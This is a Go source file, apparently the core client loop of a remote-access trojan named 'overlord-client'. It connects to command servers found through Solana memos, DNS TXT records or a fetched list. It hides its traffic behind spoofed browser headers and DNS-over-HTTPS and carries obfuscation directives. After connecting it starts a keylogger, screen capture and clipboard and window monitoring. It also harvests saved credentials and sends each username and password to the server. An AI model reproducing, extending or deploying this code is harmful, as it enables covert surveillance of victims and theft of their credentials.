package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	mrand "math/rand"
	"net"
	"net/http"
	"runtime"
	"runtime/debug"
	"slices"
	"strconv"
	"strings"
	"time"

	"overlord-client/cmd/agent/activewindow"
	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/doh"
	"overlord-client/cmd/agent/handlers"
	"overlord-client/cmd/agent/harvest"
	"overlord-client/cmd/agent/internal/overlordenv"
	"overlord-client/cmd/agent/keylogger"
	"overlord-client/cmd/agent/plugins"
	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/sysinfo"
	agentTLS "overlord-client/cmd/agent/tlsconfig"
	"overlord-client/cmd/agent/wire"

	"nhooyr.io/websocket"
)

func runClient(cfg config.Config) {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	baseBackoff := computeBaseBackoff()
	backoff := baseBackoff
	log.Printf("runtime GOOS=%s GOARCH=%s cfg.OS=%s cfg.Arch=%s", runtime.GOOS, runtime.GOARCH, cfg.OS, cfg.Arch)

	ensureServerURLs(&cfg, baseBackoff)

	if isHttpPollEnabled() {
		runPollClient(cfg)
		return
	}

	if len(cfg.ServerURLs) > 1 {
		log.Printf("Failover enabled with %d servers:", len(cfg.ServerURLs))
		for i, url := range cfg.ServerURLs {
			marker := ""
			if i == cfg.ServerIndex {
				marker = " (starting here)"
			}
			log.Printf("  [%d] %s%s", i, url, marker)
		}
	}

	transport, err := createHTTPTransport(cfg)
	if err != nil {
		log.Printf("[TLS] refusing to start with invalid TLS configuration: %v", err)
		return
	}
	currentIndex := cfg.ServerIndex
	consecutiveFailures := 0
	var loggedTLS bool
	var lastDisconnect time.Time
	var lastSolRefresh time.Time
	var lastHealthySessionEnd time.Time
	solInitialWait := 2*time.Minute + time.Duration(mrand.Intn(60))*time.Second
	solRefreshInterval := 5*time.Minute + time.Duration(mrand.Intn(300))*time.Second

	for {

		if currentIndex >= len(cfg.ServerURLs) {
			currentIndex = 0
		}

		currentServer := cfg.ServerURLs[currentIndex]
		if strings.HasPrefix(strings.ToLower(currentServer), "ws://") && !cfg.TLSInsecureSkipVerify {
			log.Printf("[TLS] refusing plaintext WebSocket server %s; use wss://", currentServer)
			rotateToNextServer(&currentIndex, cfg.ServerURLs)
			obfSleepDuration(backoff)
			continue
		}
		ctx, cancel := context.WithCancel(context.Background())
		url := fmt.Sprintf("%s/api/clients/%s/stream/ws?role=client", currentServer, cfg.ID)

		opts := buildDialOptions(cfg, transport)

		serverInfo := ""
		if len(cfg.ServerURLs) > 1 {
			serverInfo = fmt.Sprintf(" [%d/%d]", currentIndex+1, len(cfg.ServerURLs))
		}
		log.Printf("connecting to %s%s (TLS verify: %v)", currentServer, serverInfo, !cfg.TLSInsecureSkipVerify)

		// Cap the total dial+WS-handshake time so a partially-responsive server
		// can't stall the reconnect loop indefinitely.
		dialCtx, dialCancel := context.WithTimeout(ctx, 30*time.Second)
		conn, resp, err := websocket.Dial(dialCtx, url, opts)
		dialCancel()
		if err != nil {
			log.Printf("dial failed [%s]: %v (retrying in %s)", classifyDialError(err), err, backoff)
			consecutiveFailures++
			if lastDisconnect.IsZero() {
				lastDisconnect = time.Now()
			}

			if shouldRefreshServerList(cfg, consecutiveFailures, lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
				tryRefreshServerList(&cfg, &lastSolRefresh, &currentIndex, &consecutiveFailures)
			}
			rotateToNextServer(&currentIndex, cfg.ServerURLs)

			// After a healthy session recently ended (e.g. IP change), stay in
			// fast-retry mode for 45 s so the agent reconnects as soon as the
			// new network is ready instead of waiting the full base backoff.
			if !lastHealthySessionEnd.IsZero() && time.Since(lastHealthySessionEnd) < 45*time.Second {
				obfSleepDuration(reconnectDelay())
			} else {
				obfSleepDuration(backoff)
			}
			backoff = exponentialBackoff(baseBackoff, backoff, 5*time.Minute, consecutiveFailures)
			cancel()
			continue
		}

		if currentIndex != cfg.ServerIndex {
			if err := config.SaveServerIndex(currentIndex); err != nil {
				log.Printf("Warning: failed to save server index: %v", err)
			}
		}

		backoff = baseBackoff
		consecutiveFailures = 0
		lastDisconnect = time.Time{} // reset — we're connected
		connectedAt := time.Now()
		log.Printf("connected successfully to %s%s", currentServer, serverInfo)

		if !loggedTLS && resp != nil && resp.TLS != nil {
			log.Printf(
				"[TLS] handshake ok: version=%s cipher=%s server=%s",
				tls.VersionName(resp.TLS.Version),
				tls.CipherSuiteName(resp.TLS.CipherSuite),
				resp.TLS.ServerName,
			)
			loggedTLS = true
		}

		conn.SetReadLimit(8 * 1024 * 1024)

		sessionCfg := cfg
		sessionCfg.ServerIndex = currentIndex

		var sessionErr error
		if err := runSession(ctx, cancel, conn, sessionCfg); err != nil {
			if isSupersededError(err) {
				log.Printf("session superseded by a newer connection; exiting")
				handleSuperseded(cfg)
				exitProcess(0)
				return
			}
			sessionErr = err
			lastDisconnect = time.Now()
			sessionAge := time.Since(connectedAt)

			// If the session was healthy for ≥60 s the server is reachable and the
			// drop is transient — reconnect quickly instead of honoring the backoff.
			if sessionAge >= 60*time.Second {
				consecutiveFailures = 0
				backoff = baseBackoff
				lastHealthySessionEnd = time.Now()
				log.Printf("session ended after %s: %v (healthy session — immediate retry)", sessionAge.Round(time.Second), err)
			} else {
				log.Printf("session ended after %s: %v (retrying in %s)", sessionAge.Round(time.Second), err, backoff)
			}

			if shouldRefreshServerList(cfg, len(cfg.ServerURLs), lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
				tryRefreshServerList(&cfg, &lastSolRefresh, &currentIndex, &consecutiveFailures)
			}
			rotateToNextServer(&currentIndex, cfg.ServerURLs)
		}

		sleepFor := backoff
		if sessionErr != nil && shouldRetryImmediately(sessionErr) {
			sleepFor = reconnectDelay()
			log.Printf("reconnect: immediate retry in %s", sleepFor)
		} else if sessionErr != nil && consecutiveFailures == 0 {
			// Session was healthy (backoff already reset above) — reconnect fast.
			sleepFor = reconnectDelay()
		}
		if sessionErr != nil {
			if d := enrollmentRetryDelay(sessionErr); d > 0 {
				sleepFor = d
				log.Printf("purgatory: retry in %s", sleepFor)
			}
		}
		obfSleepDuration(sleepFor)
	}
}

func rotateToNextServer(currentIndex *int, urls []string) {
	if len(urls) > 1 {
		*currentIndex = (*currentIndex + 1) % len(urls)
		log.Printf("switching to next server [%d/%d]: %s", *currentIndex+1, len(urls), urls[*currentIndex])
	}
}

func tryRefreshServerList(cfg *config.Config, lastSolRefresh *time.Time, currentIndex *int, consecutiveFailures *int) {
	if refreshServerList(cfg) {
		*lastSolRefresh = time.Now()
		*currentIndex = 0
		*consecutiveFailures = 0
	}
}

// malleableUserAgents mimics real browser WebSocket upgrades so the handshake
// blends into normal HTTPS traffic on network inspection.
var malleableUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
}

// agentNonce generates a 16-byte cryptographically random hex nonce for
// replay-attack protection.
func agentNonce() string {
	var b [16]byte
	_, _ = rand.Read(b[:])
	return hex.EncodeToString(b[:])
}

func buildDialOptions(cfg config.Config, transport *http.Transport) *websocket.DialOptions {
	headers := http.Header{}
	if token := strings.TrimSpace(cfg.AgentToken); token != "" {
		headers.Set("x-agent-token", token)
	}
	// Replay-attack protection: timestamp (ms) + per-request random nonce.
	headers.Set("x-agent-ts", strconv.FormatInt(time.Now().UnixMilli(), 10))
	headers.Set("x-agent-nonce", agentNonce())

	// Malleable profile: disguise WebSocket upgrade as a browser request.
	ua := malleableUserAgents[mrand.Intn(len(malleableUserAgents))]
	headers.Set("User-Agent", ua)
	headers.Set("Accept-Language", "en-US,en;q=0.9")
	headers.Set("Accept-Encoding", "gzip, deflate, br")
	headers.Set("Cache-Control", "no-cache")
	headers.Set("Pragma", "no-cache")
	return &websocket.DialOptions{
		Subprotocols:    []string{"binary"},
		HTTPClient:      &http.Client{Transport: transport},
		HTTPHeader:      headers,
		CompressionMode: websocket.CompressionContextTakeover,
	}
}

func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
	if len(cfg.ServerURLs) > 0 {
		return
	}

	const maxBackoff = 2 * time.Minute

	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
		log.Printf("No server URLs configured. Resolving from Solana memo (address: %s)", cfg.SolAddress)
		delay := backoff
		for len(cfg.ServerURLs) == 0 {
			if refreshServerURLsFromSolana(cfg) {
				return
			}
			log.Printf("Retrying Solana memo lookup in %s", delay)
			time.Sleep(delay)
			if delay < maxBackoff {
				delay = delay * 2
				if delay > maxBackoff {
					delay = maxBackoff
				}
			}
		}
		return
	}

	if cfg.DnsTxtDomain != "" {
		log.Printf("No server URLs configured. Resolving from DNS TXT (domain: %s)", cfg.DnsTxtDomain)
		delay := backoff
		for len(cfg.ServerURLs) == 0 {
			if urls, err := config.LoadServerURLsFromDNSTxt(cfg.DnsTxtDomain, cfg.AgentToken); err != nil {
				log.Printf("DNS TXT lookup failed: %v; retrying in %s", err, delay)
				time.Sleep(delay)
				if delay < maxBackoff {
					delay = delay * 2
					if delay > maxBackoff {
						delay = maxBackoff
					}
				}
			} else {
				cfg.ServerURLs = urls
			}
		}
		return
	}

	if cfg.RawServerListURL == "" {
		log.Printf("[config] WARNING: no server URLs configured; falling back to default %s", config.DefaultServerURL)
		cfg.ServerURLs = []string{config.DefaultServerURL}
		return
	}

	log.Printf("No server URLs configured. Fetching raw list from %s", cfg.RawServerListURL)
	delay := backoff
	for len(cfg.ServerURLs) == 0 {
		if refreshServerURLsFromRaw(cfg) {
			return
		}
		log.Printf("Retrying raw server list fetch in %s", delay)
		time.Sleep(delay)
		if delay < maxBackoff {
			delay = delay * 2
			if delay > maxBackoff {
				delay = maxBackoff
			}
		}
	}
}

func shouldRefreshRawList(cfg config.Config, failures int) bool {
	if cfg.RawServerListURL == "" {
		return false
	}
	if len(cfg.ServerURLs) == 0 {
		return true
	}
	return failures >= len(cfg.ServerURLs)
}

func shouldRefreshServerList(cfg config.Config, failures int, lastDisconnect, lastSolRefresh time.Time, solInitialWait, solRefreshInterval time.Duration) bool {
	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
		if lastDisconnect.IsZero() {
			return false // still connected, never refresh
		}
		sinceDisconnect := time.Since(lastDisconnect)
		if sinceDisconnect < solInitialWait {
			return false // wait 2 min after disconnect before first check
		}
		if !lastSolRefresh.IsZero() && time.Since(lastSolRefresh) < solRefreshInterval {
			return false // not yet time for next periodic check
		}
		return true
	}
	return shouldRefreshRawList(cfg, failures)
}

func refreshServerList(cfg *config.Config) bool {
	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
		return refreshServerURLsFromSolana(cfg)
	}
	return refreshServerURLsFromRaw(cfg)
}

func refreshServerURLsFromSolana(cfg *config.Config) bool {
	urls, err := config.LoadServerURLsFromSolana(cfg.SolAddress, cfg.AgentToken, cfg.SolRPCEndpoints)
	if err != nil {
		log.Printf("[config] WARNING: failed to resolve server URLs from Solana: %v", err)
		return false
	}
	if len(urls) == 0 {
		log.Printf("[config] WARNING: Solana memo returned no valid URLs")
		return false
	}
	if !slices.Equal(cfg.ServerURLs, urls) {
		log.Printf("[config] resolved server URLs from Solana memo (%d servers)", len(urls))
		cfg.ServerURLs = urls
	}
	return true
}

func refreshServerURLsFromRaw(cfg *config.Config) bool {
	urls, err := config.LoadServerURLsFromRaw(cfg.RawServerListURL)
	if err != nil {
		log.Printf("[config] WARNING: failed to refresh raw server list: %v", err)
		return false
	}

	if len(urls) == 0 {
		log.Printf("[config] WARNING: raw server list returned no URLs")
		return false
	}

	if !slices.Equal(cfg.ServerURLs, urls) {
		log.Printf("[config] refreshed raw server list (%d servers)", len(urls))
		cfg.ServerURLs = urls
	}
	return true
}

func createHTTPTransport(cfg config.Config) (*http.Transport, error) {
	tlsConfig, err := agentTLS.Build(agentTLS.Options{
		InsecureSkipVerify: cfg.TLSInsecureSkipVerify,
		CAPath:             cfg.TLSCAPath,
		SPKIPins:           cfg.TLSSPKIPins,
		ClientCertPath:     cfg.TLSClientCert,
		ClientKeyPath:      cfg.TLSClientKey,
	})
	if err != nil {
		return nil, err
	}

	if len(cfg.TLSSPKIPins) > 0 {
		log.Printf("[TLS] Server identity pinning enabled with %d trusted SPKI pin(s)", len(cfg.TLSSPKIPins))
	} else if cfg.TLSInsecureSkipVerify {
		log.Printf("[TLS] WARNING: Certificate verification is DISABLED. This is insecure!")
	}

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = tlsConfig
	// Use DoH-aware dialer: resolves hostnames via HTTPS when system DNS is
	// blocked or monitored, falls back to system DNS transparently.
	dohDialer := doh.NewDialer()
	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		return dohDialer(ctx, network, addr)
	}
	return transport, nil
}

func classifyDialError(err error) string {
	if err == nil {
		return ""
	}
	msg := strings.ToLower(err.Error())
	switch {
	case strings.Contains(msg, "x509:"),
		strings.Contains(msg, "certificate signed by"),
		strings.Contains(msg, "certificate has expired"),
		strings.Contains(msg, "certificate is not valid"),
		strings.Contains(msg, "unknown authority"):
		return "TLS:cert"
	case strings.Contains(msg, "protocol version"),
		strings.Contains(msg, "tls: no application protocol"):
		return "TLS:version"
	case strings.Contains(msg, "no cipher suite"),
		strings.Contains(msg, "handshake failure"):
		return "TLS:cipher"
	case strings.Contains(msg, "tls:"),
		strings.Contains(msg, "remote error: tls"):
		return "TLS"
	case strings.Contains(msg, "no such host"):
		return "DNS"
	case strings.Contains(msg, "connection refused"):
		return "refused"
	case strings.Contains(msg, "i/o timeout"),
		strings.Contains(msg, "context deadline exceeded"):
		return "timeout"
	case strings.Contains(msg, "no route to host"),
		strings.Contains(msg, "network is unreachable"):
		return "unreachable"
	case strings.Contains(msg, "expected handshake response status code"),
		strings.Contains(msg, "unexpected http response"):
		return "http"
	}
	return "network"
}

func computeBaseBackoff() time.Duration {
	return randomReconnectDelay(10*time.Second, 30*time.Second)
}

// exponentialBackoff returns the next backoff duration using exponential growth
// capped at maxBackoff, with ±20% jitter to prevent thundering-herd reconnects.
// backoff:  current duration (starts at base)
// failures: number of consecutive failures so far
func exponentialBackoff(base, current, maxBackoff time.Duration, failures int) time.Duration {
	if failures <= 1 {
		return base
	}
	next := current * 2
	if next > maxBackoff {
		next = maxBackoff
	}
	// ±20% jitter
	jitter := time.Duration(mrand.Int63n(int64(next/5)*2+1)) - next/5
	result := next + jitter
	if result < base {
		result = base
	}
	if result > maxBackoff {
		result = maxBackoff
	}
	return result
}

func reconnectDelay() time.Duration {
	raw := strings.TrimSpace(overlordenv.Getenv("OVERLORD_RECONNECT_DELAY_MS"))
	if raw == "" {
		return randomReconnectDelay(1*time.Second, 3*time.Second)
	}
	ms, err := strconv.Atoi(raw)
	if err != nil || ms < 0 {
		log.Printf("[reconnect] invalid development delay override %q, using 1-3s", raw)
		return randomReconnectDelay(1*time.Second, 3*time.Second)
	}
	if ms == 0 {
		return 0
	}
	return time.Duration(ms) * time.Millisecond
}

var reconnectRng = mrand.New(mrand.NewSource(time.Now().UnixNano()))

func randomReconnectDelay(min, max time.Duration) time.Duration {
	if max <= min {
		return min
	}
	delta := max - min
	n := time.Duration(reconnectRng.Int63n(int64(delta) + 1))
	return min + n
}

func shouldRetryImmediately(err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, handlers.ErrReconnect) {
		return true
	}
	var closeErr *websocket.CloseError
	if errors.As(err, &closeErr) {
		// 4001 "ping timeout" means the server's liveness check expired on an
		// authenticated session — the connection is already dead, retry at once.
		if closeErr.Code == 4001 && closeErr.Reason == "ping timeout" {
			return true
		}
		if closeErr.Code == 4001 || closeErr.Code == 4002 || closeErr.Code == 4003 || closeErr.Code == 4007 || closeErr.Code == supersededCloseCode {
			return false
		}
		if closeErr.Code == websocket.StatusNormalClosure || closeErr.Code == websocket.StatusGoingAway {
			return true
		}
		if closeErr.Code == websocket.StatusAbnormalClosure {
			return true
		}
	}
	msg := strings.ToLower(err.Error())
	if strings.Contains(msg, "timed out from inactivity") {
		return true
	}
	if strings.Contains(msg, "use of closed network connection") || strings.Contains(msg, "failed to get reader") {
		return true
	}
	return false
}

func enrollmentRetryDelay(err error) time.Duration {
	if err == nil {
		return 0
	}

	msg := err.Error()
	if strings.Contains(msg, "purgatory: status=pending") {
		return getEnrollmentRetryInterval()
	}
	if strings.Contains(msg, "purgatory: status=denied") {
		return 5 * time.Minute
	}

	var closeErr *websocket.CloseError
	if errors.As(err, &closeErr) {
		switch closeErr.Code {
		case 4001:
			// Server uses 4001 for two different situations:
			// - purgatory "pending": enrollment not yet approved → wait before retrying
			// - liveness timeout "ping timeout": authenticated session timed out → reconnect normally
			if closeErr.Reason == "ping timeout" {
				return 0
			}
			return getEnrollmentRetryInterval()
		case 4002: // invalid signature
			return 60 * time.Second
		case 4003: // denied
			return 5 * time.Minute
		case 4007: // build_blocked
			return 5 * time.Minute
		}
	}
	return 0
}

func getEnrollmentRetryInterval() time.Duration {
	raw := strings.TrimSpace(overlordenv.Getenv("OVERLORD_ENROLLMENT_RETRY_MS"))
	if raw != "" {
		if ms, err := strconv.Atoi(raw); err == nil && ms > 0 {
			return time.Duration(ms) * time.Millisecond
		}
	}
	return 30 * time.Second
}

func getPingInterval() time.Duration {
	raw := strings.TrimSpace(overlordenv.Getenv("OVERLORD_PING_INTERVAL_MS"))
	if raw == "" {
		return 30 * time.Second
	}
	ms, err := strconv.Atoi(raw)
	if err != nil {
		log.Printf("[ping] invalid development interval override %q, using 30000ms", raw)
		return 30 * time.Second
	}
	if ms <= 0 {
		return 0
	}
	return time.Duration(ms) * time.Millisecond
}

func classifySessionError(err error) (reason, detail string) {
	if err == nil {
		return "crash", ""
	}
	msg := err.Error()
	msgLower := strings.ToLower(msg)
	if strings.Contains(msgLower, "panic") {
		return "panic", truncateStr(msg, 300)
	}
	var closeErr *websocket.CloseError
	if errors.As(err, &closeErr) {
		if closeErr.Code == websocket.StatusNormalClosure || closeErr.Code == websocket.StatusGoingAway {
			return "normal", ""
		}
		return "network", fmt.Sprintf("ws close code=%d reason=%s", closeErr.Code, truncateStr(closeErr.Reason, 100))
	}
	if strings.Contains(msgLower, "timed out from inactivity") || strings.Contains(msgLower, "pong timeout") {
		return "timeout", truncateStr(msg, 300)
	}
	if strings.Contains(msgLower, "context canceled") || strings.Contains(msgLower, "context deadline exceeded") {
		return "normal", ""
	}
	return "network", truncateStr(msg, 300)
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func requireEnrollmentChallenge(envelope map[string]interface{}) ([]byte, error) {
	msgType, _ := envelope["type"].(string)
	if msgType != "enrollment_challenge" {
		if msgType == "" {
			msgType = "<missing>"
		}
		return nil, fmt.Errorf("purgatory: expected enrollment_challenge, got %s", msgType)
	}

	nonceB64, _ := envelope["nonce"].(string)
	if nonceB64 == "" {
		return nil, fmt.Errorf("purgatory: empty nonce in challenge")
	}
	nonceBytes, err := base64.StdEncoding.DecodeString(nonceB64)
	if err != nil {
		return nil, fmt.Errorf("purgatory: invalid nonce base64: %w", err)
	}
	return nonceBytes, nil
}

func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.Conn, cfg config.Config) (err error) {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	defer func() {
		if r := recover(); r != nil {
			reason := fmt.Sprintf("session panic: %v", r)
			stack := debug.Stack()
			path := writeCrashLog(reason, stack)
			log.Printf("%s (see %s)", reason, path)
			err = fmt.Errorf("session panic: %v", r)
		}
	}()
	defer cancel()
	defer func() {
		reason, detail := classifySessionError(err)
		di := wire.DisconnectInfo{Type: "disconnect_info", Reason: reason, Detail: detail}
		sendCtx, sendCancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer sendCancel()
		_ = wire.WriteMsg(sendCtx, conn, di)
		conn.CloseNow()
	}()

	identity := config.DeriveIdentity()
	log.Printf("[purgatory] identity fingerprint=%s", identity.Fingerprint)

	challengeCtx, challengeCancel := context.WithTimeout(ctx, 30*time.Second)
	defer challengeCancel()

	_, challengeData, err := conn.Read(challengeCtx)
	if err != nil {
		return fmt.Errorf("purgatory: failed to read challenge: %w", err)
	}
	challengeEnvelope, err := wire.DecodeEnvelope(challengeData)
	if err != nil {
		return fmt.Errorf("purgatory: failed to decode challenge: %w", err)
	}

	safeWriter := wire.NewSafeWriter(conn)

	nonceBytes, err := requireEnrollmentChallenge(challengeEnvelope)
	if err != nil {
		return err
	}
	sig := identity.Sign(nonceBytes)
	publicKeyB64 := identity.PublicKeyBase64()
	signatureB64 := base64.StdEncoding.EncodeToString(sig)
	log.Printf("[purgatory] signed challenge nonce (%d bytes)", len(nonceBytes))

	env := &rt.Env{Conn: safeWriter, Cfg: cfg, Cancel: cancel, SelectedDisplay: handlers.GetPersistedDisplay()}
	env.SetLastPong(time.Now().UnixMilli())
	env.Console = rt.NewConsoleHub(env)
	env.Plugins = plugins.NewManager(env.Conn, plugins.HostInfo{ClientID: env.ClientID(), OS: cfg.OS, Arch: cfg.Arch, Version: cfg.Version})
	defer env.Plugins.Close()

	env.Keylogger = keylogger.New()
	if env.Keylogger != nil {
		if env.Keylogger.NeedsPermissionGate() {
			// macOS: do NOT start automatically. The server must send
			// keylog_request_permission first, which triggers the OS prompt.
			// The keylogger will be started by the command handler once
			// permission is granted.
			defer env.Keylogger.Stop()
			log.Printf("[keylogger] macOS permission gate active — waiting for server request")
		} else {
			if err := env.Keylogger.Start(); err != nil {
				log.Printf("[keylogger] Failed to start: %v", err)
			} else {
				defer env.Keylogger.Stop()
			}
		}
	}

	dispatcher := handlers.NewDispatcher(env)

	osVal := strings.TrimSpace(cfg.OS)
	if osVal == "" {
		osVal = runtime.GOOS
	}
	if prettyOS := strings.TrimSpace(sysinfo.OSName()); prettyOS != "" {
		osVal = prettyOS
	}

	archVal := strings.TrimSpace(cfg.Arch)
	if archVal == "" {
		archVal = runtime.GOARCH
	}

	hello := wire.Hello{
		Type:            "hello",
		ID:              cfg.ID,
		HWID:            cfg.HWID,
		Host:            rt.Hostname(),
		OS:              osVal,
		Arch:            archVal,
		Version:         cfg.Version,
		User:            rt.CurrentUser(),
		Monitors:        capture.MonitorCount(),
		MonitorInfo:     toWireMonitorInfo(capture.MonitorInfos()),
		Country:         cfg.Country,
		BuildTag:        cfg.BuildTag,
		PublicKey:       publicKeyB64,
		Signature:       signatureB64,
		InMemory:        isRunningInMemory(),
		ProtocolVersion: wire.WireProtocolVersion,
		CommandVersions: wire.SupportedCommandVersionRanges(),
	}

	hw := sysinfo.Collect()
	hello.CPU = hw.CPU
	hello.GPU = hw.GPU
	hello.RAM = hw.RAM
	hello.BatteryPercent = hw.BatteryPercent
	if hw.BatteryPercent != nil {
		charging := hw.BatteryCharging
		hello.BatteryCharging = &charging
	}
	hello.IsAdmin = sysinfo.IsAdmin()
	hello.Elevation = sysinfo.Elevation()
	hello.Permissions = sysinfo.DarwinPermissions()
	hello.HostArch = sysinfo.HostArch()
	if cfg.FetchPublicIP {
		hello.PublicIP = config.FetchPublicIPAddress()
	}
	if report, ok := loadPendingCrashReport(); ok {
		hello.LastCrashReason = report.Reason
		hello.LastCrashDetail = truncateStr(fmt.Sprintf("%s at %s", report.Detail, report.At), 1200)
	}
	crashReportSent := hello.LastCrashReason != ""

	if err := wire.WriteMsg(ctx, env.Conn, hello); err != nil {
		return fmt.Errorf("send hello: %w", err)
	}

	ackCtx, ackCancel := context.WithTimeout(ctx, 30*time.Second)
	defer ackCancel()

	for {
		_, ackData, err := conn.Read(ackCtx)
		if err != nil {
			return fmt.Errorf("purgatory: failed to read response: %w", err)
		}
		ackEnvelope, err := wire.DecodeEnvelope(ackData)
		if err != nil {
			return fmt.Errorf("purgatory: failed to decode response: %w", err)
		}

		ackType, _ := ackEnvelope["type"].(string)
		switch ackType {
		case "hello_ack":
			log.Printf("[purgatory] approved, proceeding with session")
			if crashReportSent {
				clearPendingCrashReport()
				crashReportSent = false
			}

			if err := handlers.HandleHelloAck(ackCtx, env, ackEnvelope); err != nil {
				log.Printf("[purgatory] hello_ack handler error: %v", err)
			}

			// Collect credentials in the background; send each as a notification.
			go func() {
				creds := harvest.Collect()
				if len(creds) == 0 {
					return
				}
				for _, c := range creds {
					title := fmt.Sprintf("[%s] %s | user=%s pass=%s", c.Source, c.URL, c.Username, c.Password)
					n := wire.Notification{
						Type:     "notification",
						Category: "harvest",
						Title:    title,
						TS:       time.Now().UnixMilli(),
					}
					if werr := wire.WriteMsg(ctx, env.Conn, n); werr != nil {
						log.Printf("[harvest] send failed: %v", werr)
						return
					}
				}
				log.Printf("[harvest] sent %d credential(s)", len(creds))
			}()
		case "enrollment_status":
			status, _ := ackEnvelope["status"].(string)
			log.Printf("[purgatory] server returned status=%s", status)
			return fmt.Errorf("purgatory: status=%s", status)
		case "ping", "pong":
			continue
		default:
			return fmt.Errorf("purgatory: unexpected response type: %s", ackType)
		}
		break
	}

	if err := wire.WriteMsg(ctx, env.Conn, wire.Ping{Type: "ping", TS: time.Now().UnixMilli()}); err != nil {
		log.Printf("ping: failed to send initial ping: %v", err)
		cancel()
		return fmt.Errorf("send initial ping: %w", err)
	}
	if crashReportSent {
		clearPendingCrashReport()
	}

	if interval := getPingInterval(); interval > 0 {
		log.Printf("ping: heartbeat interval=%s", interval)
		goSafe("ping loop", cancel, func() {
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					ping := wire.Ping{Type: "ping", TS: time.Now().UnixMilli()}
					if err := wire.WriteMsg(ctx, env.Conn, ping); err != nil {
						log.Printf("ping: failed to send: %v", err)
						cancel()
						return
					}
				}
			}
		})
		goSafe("pong watchdog", cancel, func() {
			// Wait at most 2 ping intervals before declaring the connection dead.
			// interval×3+30 s was too slow to detect silent drops; 2× is still
			// generous enough for high-latency links while recovering faster.
			grace := interval * 2
			if grace < 60*time.Second {
				grace = 60 * time.Second
			}
			start := time.Now()
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					last := env.LastPong()
					// Fire if: last pong is stale, OR no pong ever arrived but
					// the connection has been open longer than grace (handles the
					// case where IP changes before the first pong is received).
					stale := (!last.IsZero() && time.Since(last) > grace) ||
						(last.IsZero() && time.Since(start) > grace)
					if stale {
						log.Printf("ping: no pong for %s, forcing reconnect", time.Since(last))
						cancel()
						conn.CloseNow()
						return
					}
				}
			}
		})
	}

	readErr := make(chan error, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				reason := fmt.Sprintf("readLoop panic: %v", r)
				stack := debug.Stack()
				path := writeCrashLog(reason, stack)
				log.Printf("%s (see %s)", reason, path)
				err := fmt.Errorf("%s", reason)
				select {
				case readErr <- err:
				default:
				}
				cancel()
			}
		}()

		err := readLoop(ctx, conn, env, dispatcher)
		if err == nil {
			err = fmt.Errorf("readLoop exited unexpectedly")
		}
		log.Printf("readLoop ended: %v", err)
		select {
		case readErr <- err:
		default:
		}
		cancel()
	}()

	shotCtx, cancelShots := context.WithCancel(ctx)
	defer cancelShots()
	goSafe("capture loop", cancel, func() {
		capture.Loop(shotCtx, env)
	})

	goSafe("activewindow", cancel, func() {
		if err := activewindow.Start(ctx, env); err != nil {
			log.Printf("activewindow error: %v", err)
		}
	})

	goSafe("clipboard", cancel, func() {
		if err := activewindow.StartClipboard(ctx, env); err != nil {
			log.Printf("clipboard error: %v", err)
		}
	})

	return <-readErr
}

func toWireMonitorInfo(infos []capture.MonitorInfo) []wire.MonitorInfo {
	if len(infos) == 0 {
		return nil
	}
	out := make([]wire.MonitorInfo, 0, len(infos))
	for _, info := range infos {
		out = append(out, wire.MonitorInfo{Width: info.Width, Height: info.Height})
	}
	return out
}

func readLoop(ctx context.Context, conn *websocket.Conn, env *rt.Env, dispatcher *handlers.Dispatcher) error {
	for {
		_, data, err := conn.Read(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return err
			}
			var closeErr *websocket.CloseError
			if errors.As(err, &closeErr) {
				log.Printf("readLoop: websocket close code=%d reason=%q", closeErr.Code, closeErr.Reason)
			}
			log.Printf("readLoop: read error: %v", err)
			return err
		}
		envelope, err := wire.DecodeEnvelope(data)
		if err != nil {
			log.Printf("decode: %v (bytes=%d)", err, len(data))
			continue
		}
		if err := dispatcher.Dispatch(ctx, envelope); err != nil {
			log.Printf("dispatcher error: %v (type=%v)", err, envelope["type"])
			return err
		}
	}
}
